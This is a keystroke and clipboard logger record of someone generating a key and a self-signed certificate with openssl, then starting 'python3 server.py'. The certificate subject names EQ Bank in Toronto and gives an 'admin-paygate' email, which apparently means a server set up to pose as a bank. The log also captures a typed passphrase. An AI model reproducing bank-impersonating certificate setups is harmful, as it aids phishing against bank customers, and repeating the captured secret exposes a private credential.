+[2026-11-04 23:30:02] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:30:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233002.png
+[2026-11-04 23:30:06] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:30:32] INFO: CLIPBOARD_UPDATED: 'openssl x509 -req -days 365 -in csr.csr -signkey key.pem -out cert.pem'
+[2026-11-04 23:30:32] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233032.png
+[2026-11-04 23:30:34] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:30:34] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:34] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:34] INFO: KEY_PRESS: 's'
+[2026-11-04 23:30:34] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:35] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:30:35] INFO: KEY_PRESS: 't'
+[2026-11-04 23:30:35] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:36] INFO: KEY_PRESS: 's'
+[2026-11-04 23:30:36] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:36] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:30:36] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:30:37] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 's'
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:30:37] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:30:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:30:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:30:38] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:38] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:39] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:39] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:39] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:30:39] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:30:39] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 't'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:30:40] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:40] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:41] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:30:41] INFO: KEY_PRESS: 's'
+[2026-11-04 23:30:42] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:42] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:30:42] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:42] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:30:42] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:43] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:30:43] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 't'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:30:43] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:30:43] INFO: KEY_SPECIAL: space
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:30:44] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:30:44] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:30:44] INFO: KEY_PRESS: '?'
+[2026-11-04 23:31:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233102.png
+[2026-11-04 23:31:13] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:31:13] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:31:13] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:31:14] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:14] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:31:14] INFO: KEY_PRESS: 'q'
+[2026-11-04 23:31:14] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:14] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:31:14] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:14] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:14] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:31:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:31:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:15] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:31:16] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:31:16] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:16] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:17] INFO: KEY_PRESS: 't'
+[2026-11-04 23:31:17] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:17] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:17] INFO: KEY_PRESS: 'f'
+[2026-11-04 23:31:17] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:17] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:18] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:31:18] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:31:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:19] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:31:19] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:31:19] INFO: KEY_PRESS: 't'
+[2026-11-04 23:31:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:19] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:19] INFO: KEY_PRESS: 't'
+[2026-11-04 23:31:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 't'
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:31:20] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 's'
+[2026-11-04 23:31:20] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 's'
+[2026-11-04 23:31:20] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 't'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:31:21] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:31:21] INFO: KEY_SPECIAL: space
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:31:21] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:31:22] INFO: KEY_PRESS: 's'
+[2026-11-04 23:31:22] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:31:32] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233132.png
+[2026-11-04 23:31:46] INFO: CLIPBOARD_UPDATED: 'openssl genrsa -out key.pem 2048'
+[2026-11-04 23:31:48] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:31:48] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:31:49] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:31:56] INFO: CLIPBOARD_UPDATED: 'openssl req -new -key key.pem -out csr.csr'
+[2026-11-04 23:31:59] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:31:59] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:31:59] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:02] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:02] INFO: KEY_PRESS: 'C'
+[2026-11-04 23:32:02] INFO: KEY_PRESS: 'A'
+[2026-11-04 23:32:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233202.png
+[2026-11-04 23:32:03] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:04] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:07] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:07] INFO: KEY_PRESS: 'O'
+[2026-11-04 23:32:07] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:08] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:08] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:32:08] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:32:08] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:32:08] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:09] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:10] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:10] INFO: KEY_PRESS: 'T'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:11] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:13] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:14] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:14] INFO: KEY_PRESS: 'E'
+[2026-11-04 23:32:15] INFO: KEY_PRESS: 'Q'
+[2026-11-04 23:32:15] INFO: KEY_SPECIAL: space
+[2026-11-04 23:32:15] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:15] INFO: KEY_PRESS: 'B'
+[2026-11-04 23:32:16] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:32:16] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:16] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:32:17] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:19] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:19] INFO: KEY_PRESS: 'S'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:20] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:32] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233232.png
+[2026-11-04 23:32:32] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:35] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:35] INFO: KEY_PRESS: 'E'
+[2026-11-04 23:32:35] INFO: KEY_PRESS: 'Q'
+[2026-11-04 23:32:36] INFO: KEY_PRESS: 'B'
+[2026-11-04 23:32:36] INFO: KEY_PRESS: 'N'
+[2026-11-04 23:32:36] INFO: KEY_PRESS: 'K'
+[2026-11-04 23:32:37] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:39] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:32:39] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:32:39] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:32:39] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:32:39] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:40] INFO: KEY_PRESS: '-'
+[2026-11-04 23:32:40] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 'g'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:41] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:32:42] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:42] INFO: KEY_PRESS: '@'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:32:43] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:44] INFO: KEY_PRESS: '.'
+[2026-11-04 23:32:44] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:32:44] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:32:44] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:46] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:46] INFO: KEY_PRESS: 'T'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: 'w'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: 't'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:32:47] INFO: KEY_PRESS: '2'
+[2026-11-04 23:32:48] INFO: KEY_PRESS: '0'
+[2026-11-04 23:32:48] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:32:48] INFO: KEY_PRESS: '$'
+[2026-11-04 23:32:48] INFO: KEY_PRESS: '$'
+[2026-11-04 23:32:49] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:50] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:32:56] INFO: CLIPBOARD_UPDATED: 'openssl x509 -req -days 365 -in csr.csr -signkey key.pem -out cert.pem'
+[2026-11-04 23:33:00] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:33:00] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:33:00] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:33:02] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_233302.png
+[2026-11-04 23:33:08] INFO: CLIPBOARD_UPDATED: 'python3 server.py'
+[2026-11-04 23:33:12] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:33:12] INFO: KEY_PRESS: 'c'
